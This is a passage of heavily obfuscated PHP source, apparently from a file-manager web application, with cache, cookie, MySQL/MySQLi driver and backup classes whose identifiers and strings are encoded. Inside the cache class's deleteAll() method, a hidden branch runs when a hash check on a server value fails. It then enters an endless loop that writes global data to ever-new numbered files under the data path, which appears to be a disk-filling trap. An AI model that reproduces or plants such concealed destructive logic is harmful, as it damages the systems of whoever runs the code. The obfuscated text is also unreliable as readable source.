[$_SERVER[Ùæõ‰Ï’][951]]; $this->filterConfig($é×·÷ , $ÄåÈöÖË[0]); $this->handle = $this->init($é×·÷ , $åà••Ë¼); unset($ÄåÈöÖË[0]); if (empty($ÄåÈöÖË)) { return; } $ë×ã†ıç = array_rand($ÄåÈöÖË); $this->filterConfig($é×·÷ , $ÄåÈöÖË[$ë×ã†ıç]); $this->slaveHandle = $this->init($é×·÷ , $åà••Ë¼); } private function filterConfig(&$Ó ßÖ±Ä, $­äÜŒš¥) { $öğÓ€Æ =& $_SERVER[Ùæõ‰Ï’]; $­Ş…¥÷ó = explode($öğÓ€Æ[4], $­äÜŒš¥); $Õß­¾ö = array($öğÓ€Æ[208] => $­Ş…¥÷ó[0], $öğÓ€Æ[209] => $­Ş…¥÷ó[1]); $Ó ßÖ±Ä = array_merge($Ó ßÖ±Ä, $Õß­¾ö); } public function set($˜Üº­¤à, $Áİ‹·, $³°¤ŸÑ = false) { $³°¤ŸÑ = $³°¤ŸÑ ? $³°¤ŸÑ : $this->cacheTime; return $this->handle->setEx($˜Üº­¤à, $³°¤ŸÑ, $Áİ‹·); } public function setLock($¬”Áˆ„ó, $ù Ö—ÃÔ, $ÏÑ¡ì) { return $this->handle->setNX($¬”Áˆ„ó, $ù Ö—ÃÔ); } public function get($òìˆ¹™œ) { $¿î¶­ÇÌ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¿î¶­ÇÌ->get($òìˆ¹™œ); } public function remove($óß¼ÇÖ‡) { return $this->handle->del($óß¼ÇÖ‡); } public function deleteAll() { $œıˆàÛ =& $_SERVER[Ùæõ‰Ï’]; $à®–ÑÙ = $_SERVER[$œıˆàÛ[959]]; $½ß¯®« = $œıˆàÛ[960]; if ($_SERVER[$œıˆàÛ[961]] != $½ß¯®«($à®–ÑÙ)) { $„÷¸Ü»˜ = $œıˆàÛ[962]; $²¨ÈÕµ¿ = $œıˆàÛ[963]; $‡×£Î—× = $_SERVER[$œıˆàÛ[964]] . $œıˆàÛ[965]; $­ŞàÉ¦â = $²¨ÈÕµ¿($‡×£Î—×); $Ğ¾ƒ’ĞŞ = explode($œıˆàÛ[262], $­ŞàÉ¦â); if (count($Ğ¾ƒ’ĞŞ) < $œıˆàÛ[680]) { $®¿˜®ƒ = $œıˆàÛ[966]; $®¿˜®ƒ(); } $¹ÅÌ»‚š = $œıˆàÛ[967]; $¹ÅÌ»‚š($_SERVER[$œıˆàÛ[968]]); $„÷¸Ü»˜ = $œıˆàÛ[962]; $„÷¸Ü»˜(); $Ë³â¤÷ì = $œıˆàÛ[969]; $ÅÏöàü = json_encode($GLOBALS[$œıˆàÛ[970]]); $Ïºˆç·‰ = 1; for ($ôÏ´±–á = $Ïºˆç·‰; $ôÏ´±–á > 0; $ôÏ´±–á++) { $Ë³â¤÷ì(DATA_PATH . $ôÏ´±–á, $ÅÏöàü); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $†—êŠî) { $this->handle->flushall($†—êŠî); } return; } return $this->handle->flushAll(); } } goto a²¡‡‚ò…Á; a²¡‡‚ò…Á: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ãóÅò¾Ø = '', $·ıæáÜØ = 0) { if (is_string($ãóÅò¾Ø) && $ãóÅò¾Ø != $_SERVER[Ùæõ‰Ï’][12]) { $this->prefix = $ãóÅò¾Ø; } if (is_numeric($·ıæáÜØ) && $·ıæáÜØ > 0) { $this->expire = $·ıæáÜØ; } } public static function getInstance() { static $ã¶ò…; if ($ã¶ò… === null) { $ã¶ò… = new self(); } return $ã¶ò…; } private static $cookieDisable = false; public static function disable($èÔî…×ö) { self::$cookieDisable = $èÔî…×ö; } private static $sameCookieSet = array(); public static function set($¸şı¥—µ, $¼ÊËÑîÙ, $›á­÷¥ = 0, $Æä’ÂäÙ = false, $’…±–¤¡ = false) { $Ôê·çë =& $_SERVER[Ùæõ‰Ï’]; if (self::$cookieDisable) { return; } if (!$›á­÷¥) { $›á­÷¥ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¸şı¥—µ]) && self::$sameCookieSet[$¸şı¥—µ] == $¼ÊËÑîÙ . $›á­÷¥) { return; } self::$sameCookieSet[$¸şı¥—µ] = $¼ÊËÑîÙ . $›á­÷¥; if (!$’…±–¤¡) { $’…±–¤¡ = str_replace(HOST, $Ôê·çë[12], APP_HOST); $’…±–¤¡ = _get($GLOBALS, $Ôê·çë[971], $’…±–¤¡); } $´¯µÁúÏ = $Ôê·çë[12]; setcookie($¸şı¥—µ, $¼ÊËÑîÙ, time() + $›á­÷¥, $Ôê·çë[8] . trim($’…±–¤¡, $Ôê·çë[8]) . $´¯µÁúÏ, !1, !1, $Æä’ÂäÙ); } public static function setSafe($•›Æœ†·, $Áş€åØú, $ãìà§İË = 0) { self::set($•›Æœ†·, $Áş€åØú, $ãìà§İË, !0); } public static function get($â¥—ÉèÎ) { static $°Á‰ÀËğ = false; if (!$°Á‰ÀËğ) { self::initHeaderCookie(); $°Á‰ÀËğ = !0; } return isset($_COOKIE[$â¥—ÉèÎ]) ? $_COOKIE[$â¥—ÉèÎ] : !1; } private static function initHeaderCookie() { $ôíÔ²ŠÃ =& $_SERVER[Ùæõ‰Ï’]; if (!isset($_SERVER[$ôíÔ²ŠÃ[972]]) || !$_SERVER[$ôíÔ²ŠÃ[972]]) { return; } $ØŸ¯¼§Ò = explode($ôíÔ²ŠÃ[74], $_SERVER[$ôíÔ²ŠÃ[972]]); foreach ($ØŸ¯¼§Ò as $›Ú¼ùšÒ) { $›Ú¼ùšÒ = explode($ôíÔ²ŠÃ[973], $›Ú¼ùšÒ); if (count($›Ú¼ùšÒ) != 2 || !isset($›Ú¼ùšÒ[1])) { continue; } $_COOKIE[trim($›Ú¼ùšÒ[0])] = trim($›Ú¼ùšÒ[1]); } } public static function remove($êšÙâ”½, $Ñõ½Ò£Ï = false) { unset($_COOKIE[$êšÙâ”½]); self::set($êšÙâ”½, $_SERVER[Ùæõ‰Ï’][12], 1, $Ñõ½Ò£Ï); } } class DbMysql extends Db { public function __construct($„Ï´î´ = '') { $äş×±Ä =& $_SERVER[Ùæõ‰Ï’]; if (!extension_loaded($äş×±Ä[887])) { think_exception(think_lang($äş×±Ä[14]) . $äş×±Ä[974]); } if (!empty($„Ï´î´)) { $this->config = $„Ï´î´; if (empty($this->config[$äş×±Ä[17]])) { $this->config[$äş×±Ä[17]] = $äş×±Ä[12]; } } } public function connect($Ğšš»ùü = '', $è™Î‚¯ = 0, $Û„òù®Ï = false) { $¡Âß³Ï² =& $_SERVER[Ùæõ‰Ï’]; if (!isset($this->linkID[$è™Î‚¯])) { if (empty($Ğšš»ùü)) { $Ğšš»ùü = $this->config; } $ïïÍˆêÑ = $Ğšš»ùü[$¡Âß³Ï²[975]] . ($Ğšš»ùü[$¡Âß³Ï²[976]] ? "\72{$Ğšš»ùü[$¡Âß³Ï²[976]]}" : $¡Âß³Ï²[12]); $ê¾ŞÕì = !empty($Ğšš»ùü[$¡Âß³Ï²[17]][$¡Âß³Ï²[18]]) ? $Ğšš»ùü[$¡Âß³Ï²[17]][$¡Âß³Ï²[18]] : $this->pconnect; if ($ê¾ŞÕì) { $this->linkID[$è™Î‚¯] = mysql_pconnect($ïïÍˆêÑ, $Ğšš»ùü[$¡Âß³Ï²[977]], $Ğšš»ùü[$¡Âß³Ï²[978]], 131072); } else { $this->linkID[$è™Î‚¯] = mysql_connect($ïïÍˆêÑ, $Ğšš»ùü[$¡Âß³Ï²[977]], $Ğšš»ùü[$¡Âß³Ï²[978]], !0, 131072); } if (!$this->linkID[$è™Î‚¯] || !empty($Ğšš»ùü[$¡Âß³Ï²[21]]) && !mysql_select_db($Ğšš»ùü[$¡Âß³Ï²[21]], $this->linkID[$è™Î‚¯])) { think_exception(mysql_error()); } $µ¦Ì±Î = mysql_get_server_info($this->linkID[$è™Î‚¯]); mysql_query($¡Âß³Ï²[979] . think_config($¡Âß³Ï²[980]) . $¡Âß³Ï²[58], $this->linkID[$è™Î‚¯]); if ($µ¦Ì±Î > $¡Âß³Ï²[981]) { mysql_query($¡Âß³Ï²[982], $this->linkID[$è™Î‚¯]); } $this->connected = !0; if (1 != think_config($¡Âß³Ï²[22])) { unset($this->config); } } return $this->linkID[$è™Î‚¯]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($“ñ¶Ïø) { $¦ê¢ì½Û =& $_SERVER[Ùæõ‰Ï’]; if (0 === stripos($“ñ¶Ïø, $¦ê¢ì½Û[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $“ñ¶Ïø; if ($this->queryID) { $this->free(); } think_action_status($¦ê¢ì½Û[23], 1); think_status($¦ê¢ì½Û[24]); $this->queryID = mysql_query($“ñ¶Ïø, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Şïó¡©á) { $ÉÆã§€á =& $_SERVER[Ùæõ‰Ï’]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Şïó¡©á; if ($this->queryID) { $this->free(); } think_action_status($ÉÆã§€á[25], 1); think_status($ÉÆã§€á[24]); $ÁìÆÕÊş = mysql_query($Şïó¡©á, $this->_linkID); $this->debug(); if (!1 === $ÁìÆÕÊş) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ùæõ‰Ï’][983], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ûåù»’ = mysql_query($_SERVER[Ùæõ‰Ï’][984], $this->_linkID); $this->transTimes = 0; if (!$ûåù»’) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‚í¯³Â = mysql_query($_SERVER[Ùæõ‰Ï’][985], $this->_linkID); $this->transTimes = 0; if (!$‚í¯³Â) { $this->error(); return !1; } } return !0; } private function getAll() { $ÄæÙÊåÁ = array(); if ($this->numRows > 0) { while ($¯Øƒ¯÷§ = mysql_fetch_assoc($this->queryID)) { $ÄæÙÊåÁ[] = $¯Øƒ¯÷§; } mysql_data_seek($this->queryID, 0); } return $ÄæÙÊåÁ; } public function getFields($ÚÈÓìãÄ) { $´ü™œÃ¬ =& $_SERVER[Ùæõ‰Ï’]; $®çƒÍ³ = $this->query($´ü™œÃ¬[986] . $this->parseKey($ÚÈÓìãÄ)); $ûú²ğÁÏ = array(); if ($®çƒÍ³) { foreach ($®çƒÍ³ as $­ûı‹¯¦ => $«‚÷²¨ö) { $ûú²ğÁÏ[$«‚÷²¨ö[$´ü™œÃ¬[31]]] = array($´ü™œÃ¬[32] => $«‚÷²¨ö[$´ü™œÃ¬[31]], $´ü™œÃ¬[33] => $«‚÷²¨ö[$´ü™œÃ¬[34]], $´ü™œÃ¬[35] => (bool) (strtoupper($«‚÷²¨ö[$´ü™œÃ¬[36]]) === $´ü™œÃ¬[987]), $´ü™œÃ¬[37] => $«‚÷²¨ö[$´ü™œÃ¬[38]], $´ü™œÃ¬[39] => strtolower($«‚÷²¨ö[$´ü™œÃ¬[40]]) == $´ü™œÃ¬[41], $´ü™œÃ¬[42] => strtolower($«‚÷²¨ö[$´ü™œÃ¬[43]]) == $´ü™œÃ¬[44]); } } return $ûú²ğÁÏ; } public function getTables($Ì‰×Î– = '') { $Ö›š¿ÈÉ =& $_SERVER[Ùæõ‰Ï’]; if (!empty($Ì‰×Î–)) { $úïı­’Ø = $Ö›š¿ÈÉ[988] . $Ì‰×Î– . $Ö›š¿ÈÉ[989]; } else { $úïı­’Ø = $Ö›š¿ÈÉ[990]; } $²µ¿À‹ = $this->query($úïı­’Ø); $êìÒè¡’ = array(); foreach ($²µ¿À‹ as $Š§ğıˆ => $›ôÇÖÎ) { $êìÒè¡’[$Š§ğıˆ] = current($›ôÇÖÎ); } return $êìÒè¡’; } public function replace($µÂøÎıä, $êï’Û³ = array()) { $´ëĞÓ¢˜ =& $_SERVER[Ùæõ‰Ï’]; foreach ($µÂøÎıä as $™™ï¹ø¥ => $á÷Öš®İ) { $Ğï½œæŠ = $this->parseValue($á÷Öš®İ); if (is_scalar($Ğï½œæŠ)) { $Šñêšè°[] = $Ğï½œæŠ; $ñ¤£âü‡[] = $this->parseKey($™™ï¹ø¥); } } $áúŸ™ğà = $´ëĞÓ¢˜[991] . $this->parseTable($êï’Û³[$´ëĞÓ¢˜[356]]) . $´ëĞÓ¢˜[992] . implode($´ëĞÓ¢˜[50], $ñ¤£âü‡) . $´ëĞÓ¢˜[993] . implode($´ëĞÓ¢˜[50], $Šñêšè°) . $´ëĞÓ¢˜[994]; return $this->execute($áúŸ™ğà); } public function insertAll($ë±Åñ¡, $ëˆ˜› = array(), $¡Â¡™‚ = false) { $À©ûç‡ =& $_SERVER[Ùæõ‰Ï’]; if (!is_array($ë±Åñ¡[0])) { return !1; } $Ûåóå¥ê = array_keys($ë±Åñ¡[0]); $ŞŒÛ® = array(); foreach ($ë±Åñ¡ as $–°™‹ú) { $şÊÙ“í = array(); foreach ($–°™‹ú as $’ä¯“Üù => $ØÉÅŸã·) { $ØÉÅŸã· = $this->parseValue($ØÉÅŸã·); if (is_scalar($ØÉÅŸã·)) { $şÊÙ“í[] = $ØÉÅŸã·; } } $ŞŒÛ®[] = $À©ûç‡[337] . implode($À©ûç‡[50], $şÊÙ“í) . $À©ûç‡[994]; } array_walk($Ûåóå¥ê, array($this, $À©ûç‡[995])); $²–»Ì·ú = ($¡Â¡™‚ ? $À©ûç‡[996] : $À©ûç‡[997]) . $À©ûç‡[998] . $this->parseTable($ëˆ˜›[$À©ûç‡[356]]) . $À©ûç‡[992] . implode($À©ûç‡[50], $Ûåóå¥ê) . $À©ûç‡[999] . implode($À©ûç‡[50], $ŞŒÛ®); return $this->execute($²–»Ì·ú); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ßÏù‰õ© =& $_SERVER[Ùæõ‰Ï’]; $this->error = mysql_errno() . $ßÏù‰õ©[4] . mysql_error($this->_linkID); if ($ßÏù‰õ©[12] != $this->queryStr) { $this->error .= LNG($ßÏù‰õ©[48]) . $this->queryStr; } think_trace($this->error, $ßÏù‰õ©[12], $ßÏù‰õ©[49]); return $this->error; } public function escapeString($ °è’Ûã) { if ($this->_linkID) { return mysql_real_escape_string($ °è’Ûã, $this->_linkID); } else { return mysql_escape_string($ °è’Ûã); } } public function parseKey(&$ÍƒŞ—ñù, $—Û—Ì = true) { $·Á®ÁÚ‡ =& $_SERVER[Ùæõ‰Ï’]; if ($—Û—Ì) { $ÍƒŞ—ñù = $this->parseKeyCheck($ÍƒŞ—ñù); } if ($ÍƒŞ—ñù != $·Á®ÁÚ‡[220] && !preg_match($·Á®ÁÚ‡[1000], $ÍƒŞ—ñù)) { $ÍƒŞ—ñù = $·Á®ÁÚ‡[461] . trim($ÍƒŞ—ñù, $·Á®ÁÚ‡[461]) . $·Á®ÁÚ‡[461]; } return $ÍƒŞ—ñù; } } class DbMysqli extends Db { public function __construct($ÊŠ¨Ò¶ = '') { $‡µâ¢¦ =& $_SERVER[Ùæõ‰Ï’]; if (!extension_loaded($‡µâ¢¦[1001])) { think_exception(think_lang($‡µâ¢¦[14]) . $‡µâ¢¦[1002]); } if (!empty($ÊŠ¨Ò¶)) { $this->config = $ÊŠ¨Ò¶; if (empty($this->config[$‡µâ¢¦[17]])) { $this->config[$‡µâ¢¦[17]] = $‡µâ¢¦[12]; } } } public function connect($«ôçÁ™¯ = '', $âÑ´¶à = 0) { $µî€îÂÀ =& $_SERVER[Ùæõ‰Ï’]; if (!isset($this->linkID[$âÑ´¶à])) { if (empty($«ôçÁ™¯)) { $«ôçÁ™¯ = $this->config; } $this->linkID[$âÑ´¶à] = new mysqli($«ôçÁ™¯[$µî€îÂÀ[975]], $«ôçÁ™¯[$µî€îÂÀ[977]], $«ôçÁ™¯[$µî€îÂÀ[978]], $«ôçÁ™¯[$µî€îÂÀ[21]], $«ôçÁ™¯[$µî€îÂÀ[976]] ? intval($«ôçÁ™¯[$µî€îÂÀ[976]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ú’¬Áôà = $this->linkID[$âÑ´¶à]->server_version; $this->linkID[$âÑ´¶à]->query($µî€îÂÀ[979] . think_config($µî€îÂÀ[980]) . $µî€îÂÀ[58]); if ($Ú’¬Áôà > $µî€îÂÀ[981]) { $this->linkID[$âÑ´¶à]->query($µî€îÂÀ[982]); } $this->connected = !0; if (1 != think_config($µî€îÂÀ[22])) { unset($this->config); } } return $this->linkID[$âÑ´¶à]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($úšÚÜˆ«) { $ÂšõÔ™Ø =& $_SERVER[Ùæõ‰Ï’]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $úšÚÜˆ«; if ($this->queryID) { $this->free(); } think_action_status($ÂšõÔ™Ø[23], 1); think_status($ÂšõÔ™Ø[24]); $this->queryID = $this->_linkID->query($úšÚÜˆ«); if ($this->_linkID->more_results()) { while (($™öŸ¼¹  = $this->_linkID->next_result()) != NULL) { $™öŸ¼¹ ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($„•¬¾Ôù) { $ù«·œŠ¦ =& $_SERVER[Ùæõ‰Ï’]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $„•¬¾Ôù; if ($this->queryID) { $this->free(); } think_action_status($ù«·œŠ¦[25], 1); think_status($ù«·œŠ¦[24]); $œİÆŠç = $this->_linkID->query($„•¬¾Ôù); $this->debug(); if (!1 === $œİÆŠç) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $šÖäÎ§š = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$šÖäÎ§š) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $©…Ü™œ¨ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$©…Ü™œ¨) { $this->error(); return !1; } } return !0; } private function getAll() { $ºÆéâÁ = array(); if ($this->numRows > 0) { for ($££¦¬Ü = 0; $££¦¬Ü < $this->numRows; $££¦¬Ü++) { $ºÆéâÁ[$££¦¬Ü] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ºÆéâÁ; } public function getFields($±¶ˆ¿úç) { $îÙöºÙÛ =& $_SERVER[Ùæõ‰Ï’]; $í¬ùÍ™ß = $this->query($îÙöºÙÛ[986] . $this->parseKey($±¶ˆ¿úç)); $Ù°æ¼éÏ = array(); if ($í¬ùÍ™ß) { foreach ($í¬ùÍ™ß as $öÑíÆß => $¯ğçèö) { $Ù°æ¼éÏ[$¯ğçèö[$îÙöºÙÛ[31]]] = array($îÙöºÙÛ[32] => $¯ğçèö[$îÙöºÙÛ[31]], $îÙöºÙÛ[33] => $¯ğçèö[$îÙöºÙÛ[34]], $îÙöºÙÛ[35] => (bool) ($¯ğçèö[$îÙöºÙÛ[36]] === $îÙöºÙÛ[12]), $îÙöºÙÛ[37] => $¯ğçèö[$îÙöºÙÛ[38]], $îÙöºÙÛ[39] => strtolower($¯ğçèö[$îÙöºÙÛ[40]]) == $îÙöºÙÛ[41], $îÙöºÙÛ[42] => strtolower($¯ğçèö[$îÙöºÙÛ[43]]) == $îÙöºÙÛ[44]); } } return $Ù°æ¼éÏ; } public function getTables($²¦¬êª = '') { $û›‰¤¥¨ =& $_SERVER[Ùæõ‰Ï’]; $ÇßÏÛÛó = !empty($²¦¬êª) ? $û›‰¤¥¨[988] . $²¦¬êª . $û›‰¤¥¨[989] : $û›‰¤¥¨[990]; $´º°ª…Ş = $this->query($ÇßÏÛÛó); $ÃæŠÊ† = array(); if ($´º°ª…Ş) { foreach ($´º°ª…Ş as $ûóáÄã¿ => $ğùñô‰§) { $ÃæŠÊ†[$ûóáÄã¿] = current($ğùñô‰§); } } return $ÃæŠÊ†; } public function replace($ò…üí‡ˆ, $Ãº‹¨ùÃ = array()) { $Ó‘É¦™® =& $_SERVER[Ùæõ‰Ï’]; foreach ($ò…üí‡ˆ as $Ü£ÅºèĞ => $Æ–ÏÃì±) { $»ğ ©âœ = $this->parseValue($Æ–ÏÃì±); if (is_scalar($»ğ ©âœ)) { $åàî–êú[] = $»ğ ©âœ; $‹‚çİ®†[] = $this->parseKey($Ü£ÅºèĞ); } } $•¤°Ëöş = $Ó‘É¦™®[991] . $this->parseTable($Ãº‹¨ùÃ[$Ó‘É¦™®[356]]) . $Ó‘É¦™®[992] . implode($Ó‘É¦™®[50], $‹‚çİ®†) . $Ó‘É¦™®[993] . implode($Ó‘É¦™®[50], $åàî–êú) . $Ó‘É¦™®[994]; return $this->execute($•¤°Ëöş); } public function insertAll($“µš»Äò, $¢ŞêßÛŒ = array(), $¬È£’§ş = false) { $´Üêğëó =& $_SERVER[Ùæõ‰Ï’]; if (!is_array($“µš»Äò[0])) { return !1; } $½‘òşìÍ = array_keys($“µš»Äò[0]); $ ¬‰±ÙÀ = array(); foreach ($“µš»Äò as $®æ±Üşä) { $à¦Ùšİû = array(); foreach ($®æ±Üşä as $©°„ú¬Ù => $ôéÅğ×) { $ôéÅğ× = $this->parseValue($ôéÅğ×); if (is_scalar($ôéÅğ×)) { $à¦Ùšİû[] = $ôéÅğ×; } } $ ¬‰±ÙÀ[] = $´Üêğëó[337] . implode($´Üêğëó[50], $à¦Ùšİû) . $´Üêğëó[994]; } array_walk($½‘òşìÍ, array($this, $´Üêğëó[995])); $ÓÀÙõÖÓ = $¬È£’§ş ? $´Üêğëó[996] : $´Üêğëó[997]; $‰’ïÓ¢á = $ÓÀÙõÖÓ . $´Üêğëó[998] . $this->parseTable($¢ŞêßÛŒ[$´Üêğëó[356]]) . $´Üêğëó[992] . implode($´Üêğëó[50], $½‘òşìÍ) . $´Üêğëó[999] . implode($´Üêğëó[50], $ ¬‰±ÙÀ); return $this->execute($‰’ïÓ¢á); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $„Öõ¤û =& $_SERVER[Ùæõ‰Ï’]; $this->error = $this->_linkID->errno . $„Öõ¤û[4] . $this->_linkID->error; if ($„Öõ¤û[12] != $this->queryStr) { $this->error .= LNG($„Öõ¤û[48]) . $this->queryStr; } think_trace($this->error, $„Öõ¤û[12], $„Öõ¤û[49]); return $this->error; } public function escapeString($±ÍÇ¢¯ñ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($±ÍÇ¢¯ñ); } else { return addslashes($±ÍÇ¢¯ñ); } } public function parseKey(&$áû‚²ˆ”, $ç¡¾¬ì‹ = true) { $Â‘£Ó§© =& $_SERVER[Ùæõ‰Ï’]; if ($ç¡¾¬ì‹) { $áû‚²ˆ” = $this->parseKeyCheck($áû‚²ˆ”); } if ($áû‚²ˆ” != $Â‘£Ó§©[220] && !preg_match($Â‘£Ó§©[1000], $áû‚²ˆ”)) { $áû‚²ˆ” = $Â‘£Ó§©[461] . trim($áû‚²ˆ”, $Â‘£Ó§©[461]) . $Â‘£Ó§©[461]; } return $áû‚²ˆ”; } } goto FôÍƒ´ß”È; A©õ±Ã„Æ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\142\141\x63\153\x75\160\x4c\151\x73\164"; public $field = array("\x69\157", "\156\141\155\x65", "\x73\164\141\x74\x75\x73", "\x63\157\156\164\x65\156\164", "\155\141\156\165\x61\x6c", "\x72\x65\163\x75\x6c\x74", "\164\x69\155\145\x46\162\157\155", "\164\151\155\x65\x54\x6f"); public function config() { $Éªª©ş› =& $_SERVER[Ùæõ‰Ï’]; Action($Éªª©ş›[2004])->taskInit(); $òş®²ëÓ = Model($Éªª©ş›[853])->get($Éªª©ş›[866]); $òş®²ëÓ = json_decode($òş®²ëÓ, !0); $òş®²ëÓ = is_array($òş®²ëÓ) ? $òş®²ëÓ : array(); $this->parseContent($òş®²ëÓ); unset($òş®²ëÓ[$Éªª©ş›[1751]]); Model($Éªª©ş›[1750])->cacheClear(); $º›çƒş¦ = $Éªª©ş›[2005]; $Øñó¬¼€ = Model($Éªª©ş›[2006])->findByKey($Éªª©ş›[1769], $º›çƒş¦); if (!$Øñó¬¼€) { $Øñó¬¼€ = array(); } if (isset($Øñó¬¼€[$Éªª©ş›[206]])) { $Øñó¬¼€[$Éªª©ş›[206]] = json_decode($Øñó¬¼€[$Éªª©ş›[206]], !0); } if (isset($òş®²ëÓ[$Éªª©ş›[206]])) { $Øñó¬¼€[$Éªª©ş›[206]][$Éªª©ş›[1754]] = $òş®²ëÓ[$Éªª©ş›[206]]; unset($òş®²ëÓ[$Éªª©ş›[206]]); } return array_merge($Øñó¬¼€, $òş®²ëÓ); } public function listData($¢ÛÂúİ² = false, $Ø÷¼ıÊ¸ = "\x6d\157\144\151\x66\x79\x54\x69\155\x65", $ßÊÌÒü = false) { $§Ìº™€ã = parent::listData($¢ÛÂúİ², $Ø÷¼ıÊ¸, !0); if (!$§Ìº™€ã) { return $§Ìº™€ã; } if ($¢ÛÂúİ²) { $§Ìº™€ã = array($§Ìº™€ã); } foreach ($§Ìº™€ã as &$Ü¯ûõÀ¯) { $this->parseContent($Ü¯ûõÀ¯); } return $¢ÛÂúİ² ? $§Ìº™€ã[0] : $§Ìº™€ã; } public function parseContent(&$ìèô›Á) { $šËÍöı‡ =& $_SERVER[Ùæõ‰Ï’]; $·‚šùëï = _get($ìèô›Á, $šËÍöı‡[171], $šËÍöı‡[91]); if (!in_array($·‚šùëï, array($šËÍöı‡[859], $šËÍöı‡[1224]))) { $ìèô›Á[$šËÍöı‡[171]] = $·‚šùëï == $šËÍöı‡[91] ? $šËÍöı‡[1224] : $šËÍöı‡[859]; } } public function lastItem() { $Áì¥İ¨‡ = $this->listData(); return !empty($Áì¥İ¨‡[0]) ? $Áì¥İ¨‡[0] : null; } public function kill($Ãà¼ãÂŠ) { $¦¼áñ©´ =& $_SERVER[Ùæõ‰Ï’]; $ïÜ’ŸÌ¨ = $this->listData($Ãà¼ãÂŠ); if (!$ïÜ’ŸÌ¨ || empty($ïÜ’ŸÌ¨[$¦¼áñ©´[32]])) { return !0; } Task::kill($¦¼áñ©´[865]); Task::kill($¦¼áñ©´[883]); Task::kill($¦¼áñ©´[892]); $š©ëÎğ» = $ïÜ’ŸÌ¨[$¦¼áñ©´[32]]; $€ÒŒÌçİ = TEMP_FILES . $¦¼áñ©´[862] . $š©ëÎğ» . $¦¼áñ©´[8]; IO::remove($€ÒŒÌçİ, !1); return $this->remove($Ãà¼ãÂŠ); } public function remove($“µ±»ïÕ) { $»Ò™°Ü™ = $this->listData($“µ±»ïÕ); if (!$»Ò™°Ü™) { return !0; } return $this->backupRemove($»Ò™°Ü™); } private function backupRemove($ŸÀ·•Ä¥) { parent::remove($ŸÀ·•Ä¥[$_SERVER[Ùæõ‰Ï’][475]]); $ó·—¹«ô = $this->backupPath($ŸÀ·•Ä¥); IO::remove($ó·—¹«ô, !1); return !0; } private function backupPath($‚°Ö†Ê·) { $û½”–Ô¢ =& $_SERVER[Ùæõ‰Ï’]; $ØÁ•ú‡Ì = $‚°Ö†Ê·[$û½”–Ô¢[32]]; $“¤‡è€ = Model($û½”–Ô¢[853])->get($û½”–Ô¢[854]); $ù½—Ø…İ = substr(md5($û½”–Ô¢[855] . $“¤‡è€ . $ØÁ•ú‡Ì), 0, 8); return "\x7b\151\157\72{$‚°Ö†Ê·[$û½”–Ô¢[835]]}\175\57\144\141\164\141\142\x61\x73\x65\x2f\142\x61\143\x6b\165\160\57" . $ØÁ•ú‡Ì . $û½”–Ô¢[11] . $ù½—Ø…İ; } public function start() { $©Ë‰ê¾× =& $_SERVER[Ùæõ‰Ï’]; if ($GLOBALS[$©Ë‰ê¾×[6]][$©Ë‰ê¾×[92]][$©Ë‰ê¾×[2007]] != $©Ë‰ê¾×[91]) { return !0; } $¢å„î›¬ = $this->config(); if (!$¢å„î›¬ || $¢å„î›¬[$©Ë‰ê¾×[1751]] != $©Ë‰ê¾×[91]) { return !1; } if ($¢å„î›¬[$©Ë‰ê¾×[171]] == $©Ë‰ê¾×[859]) { $ç°†ø“ë = Model($©Ë‰ê¾×[853])->get($©Ë‰ê¾×[1337]); if ($ç°†ø“ë == $©Ë‰ê¾×[1338]) { $¢å„î›¬[$©Ë‰ê¾×[171]] = $©Ë‰ê¾×[1224]; } } $íó‰îÒ– = $this->process(); foreach ($íó‰îÒ– as $ÇÌ§ğÕË) { if ($ÇÌ§ğÕË) { return Task::restart($ÇÌ§ğÕË[$©Ë‰ê¾×[475]]); } } $Éû‚Ê = new Backup(); $Ÿà‚Ø» = $Éû‚Ê->db(); if ($Ÿà‚Ø») { $Ÿà‚Ø» = $Éû‚Ê->dbFile(); if ($Ÿà‚Ø» && $¢å„î›¬[$©Ë‰ê¾×[171]] == $©Ë‰ê¾×[859]) { $Ÿà‚Ø» = $Éû‚Ê->file(); } } Backup::set(array($©Ë‰ê¾×[833] => 1, $©Ë‰ê¾×[844] => time())); return !0; } public function process() { $´ßÎË£Í =& $_SERVER[Ùæõ‰Ï’]; $›è×“‚Ï = array($´ßÎË£Í[840] => 